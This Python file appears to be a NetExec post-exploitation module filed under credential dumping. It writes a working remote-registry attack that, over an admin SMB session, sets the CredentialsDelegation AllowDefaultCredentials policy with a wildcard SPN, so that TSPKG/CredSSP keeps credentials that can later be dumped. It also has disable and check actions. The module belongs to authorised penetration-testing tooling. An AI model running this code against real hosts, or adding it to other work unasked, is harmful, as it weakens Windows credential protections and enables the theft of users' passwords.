from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from sys import exit
import contextlib
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Enable, disable, or check AllowDefaultCredentials to control TSPKG / CredSSP credential delegation
    Module by @E1A
    """
    
    name = "tspkg"
    description = (
        "Creates, removes or inspects the AllowDefaultCredentials registry entry"
        "to enable or disable TSPKG / CredSSP credential delegation used for credential-dumping"
    )
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """ACTION  Create/Delete the registry key (choices: enable, disable, check)"""
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            exit(1)

        if module_options["ACTION"].lower() not in ["enable", "disable", "check"]:
            context.log.fail("Invalid value for ACTION option!")
            exit(1)

        self.action = module_options["ACTION"].lower()

    def on_admin_login(self, context, connection):
        if self.action == "enable":
            self.enable_allow_default_credentials(context, connection.conn)
        elif self.action == "disable":
            self.disable_allow_default_credentials(context, connection.conn)
        elif self.action == "check":
            self.check_allow_default_credentials(context, connection.conn)

    def enable_allow_default_credentials(self, context, smbconnection):
        remote_ops = RemoteOperations(smbconnection, False)
        remote_ops.enableRegistry()

        try:
            if not remote_ops._RemoteOperations__rrp:
                context.log.fail("Registry RPC not available")
                return

            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            hklm = ans["phKey"]

            key_path = "SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation"
            try:
                ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, hklm, key_path)
                key_handle = ans["phkResult"]
            except DCERPCException:
                ans = rrp.hBaseRegCreateKey(remote_ops._RemoteOperations__rrp, hklm, key_path)
                key_handle = ans["phkResult"]

            # main DWORD to enable delegation
            rrp.hBaseRegSetValue(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials\x00", rrp.REG_DWORD, 1)

            rrp.hBaseRegSetValue(remote_ops._RemoteOperations__rrp, key_handle, "ConcatenateDefaults_AllowDefault\x00", rrp.REG_DWORD, 1)

            # create subkey and add SPN entry as value "1"
            try:
                ans = rrp.hBaseRegCreateKey(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials")
                subkey_handle = ans["phkResult"]
            except DCERPCException:
                ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials")
                subkey_handle = ans["phkResult"]

            rrp.hBaseRegSetValue(remote_ops._RemoteOperations__rrp, subkey_handle, "1\x00", rrp.REG_SZ, "*\x00")

            rtype, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials\x00")
            try:
                val = int(data)
            except Exception:
                val = int.from_bytes(data[:4], "little") if isinstance(data, (bytes, bytearray)) and len(data) >= 1 else None

            if val == 1:
                context.log.success("AllowDefaultCredentials registry DWORD created successfully")
            else:
                context.log.fail(f"Unexpected value for AllowDefaultCredentials: {data}")

        except Exception as e:
            context.log.fail(f"Failed to enable AllowDefaultCredentials: {e}")
        finally:
            with contextlib.suppress(Exception):
                remote_ops.finish()

    def disable_allow_default_credentials(self, context, smbconnection):
        remote_ops = RemoteOperations(smbconnection, False)
        remote_ops.enableRegistry()

        try:
            if not remote_ops._RemoteOperations__rrp:
                context.log.fail("Registry RPC not available")
                return

            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            hklm = ans["phKey"]

            try:
                ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, hklm, "SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation")
                key_handle = ans["phkResult"]
            except DCERPCException:
                context.log.success("CredentialsDelegation policy not present (nothing to delete)")
                return

            # remove SPN entry and subkey if present
            try:
                ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials")
                sub_handle = ans["phkResult"]
                try:
                    rrp.hBaseRegDeleteValue(remote_ops._RemoteOperations__rrp, sub_handle, "1\x00")
                    context.log.debug("Deleted subkey value '1'")
                except Exception:
                    context.log.debug("Subkey value '1' not present or already deleted")
                try:
                    rrp.hBaseRegDeleteKey(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials")
                    context.log.debug("Deleted AllowDefaultCredentials subkey")
                except Exception:
                    context.log.debug("Could not delete AllowDefaultCredentials subkey (may contain other entries)")
            except DCERPCException:
                context.log.debug("AllowDefaultCredentials subkey not present")

            for val in ("AllowDefaultCredentials\x00", "ConcatenateDefaults_AllowDefault\x00"):
                try:
                    rrp.hBaseRegDeleteValue(remote_ops._RemoteOperations__rrp, key_handle, val)
                    context.log.debug(f"Deleted value {val}")
                except Exception:
                    context.log.debug(f"Value {val} not present")

            try:
                rtype, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials\x00")
                context.log.fail("AllowDefaultCredentials registry value still present after delete attempt")
            except DCERPCException:
                context.log.success("AllowDefaultCredentials registry entries deleted (or not present)")

        except Exception as e:
            context.log.fail(f"Failed to disable AllowDefaultCredentials: {e}")
        finally:
            with contextlib.suppress(Exception):
                remote_ops.finish()

    def check_allow_default_credentials(self, context, smbconnection):
        remote_ops = RemoteOperations(smbconnection, False)
        remote_ops.enableRegistry()

        try:
            if not remote_ops._RemoteOperations__rrp:
                context.log.fail("Registry RPC not available")
                return

            ans = rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            hklm = ans["phKey"]

            # Try to open the CredentialsDelegation key if it does not exist, treat as not present
            try:
                ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, hklm, "SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation")
                key_handle = ans["phkResult"]
            except DCERPCException:
                context.log.fail("AllowDefaultCredentials registry key not present")
                return

            # Query the main DWORD value safely (handle bytes or int)
            try:
                rtype, data = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials\x00")
                try:
                    val = int(data)
                except Exception:
                    val = int.from_bytes(data[:4], "little") if isinstance(data, (bytes, bytearray)) and len(data) >= 1 else None

                if val == 1:
                    context.log.success("AllowDefaultCredentials registry key is enabled")
                else:
                    context.log.fail(f"Unexpected registry value for AllowDefaultCredentials: {data}")
            except DCERPCException:
                context.log.fail("AllowDefaultCredentials registry key is disabled (registry key not found)")

            try:
                ans = rrp.hBaseRegOpenKey(remote_ops._RemoteOperations__rrp, key_handle, "AllowDefaultCredentials")
                sub_handle = ans["phkResult"]
                rtype, spn = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, sub_handle, "1\x00")
                spn_display = spn.decode() if isinstance(spn, (bytes, bytearray)) else str(spn)
                context.log.info(f"SPN entry under AllowDefaultCredentials: {spn_display}")
            except DCERPCException:
                context.log.debug("No AllowDefaultCredentials subkey or SPN entry present")

        except Exception as e:
            context.log.fail(f"Failed to check AllowDefaultCredentials: {e}")
        finally:
            with contextlib.suppress(Exception):
                remote_ops.finish()
